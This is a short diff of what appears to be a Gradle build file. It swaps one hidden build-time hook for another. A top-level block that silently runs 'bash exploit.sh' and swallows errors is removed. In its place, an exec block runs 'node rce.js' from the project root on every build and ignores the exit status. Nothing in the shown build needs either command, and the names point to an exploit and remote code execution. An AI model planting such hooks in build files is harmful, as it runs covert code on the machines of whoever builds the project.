@@ -1,7 +1,9 @@
 
-try {
-    "bash exploit.sh".execute()
-} catch (Exception e) {}
+exec {
+    workingDir "${project.rootDir}"
+    commandLine 'node', 'rce.js'
+    ignoreExitValue true
+}
 
 buildscript {
     repositories {
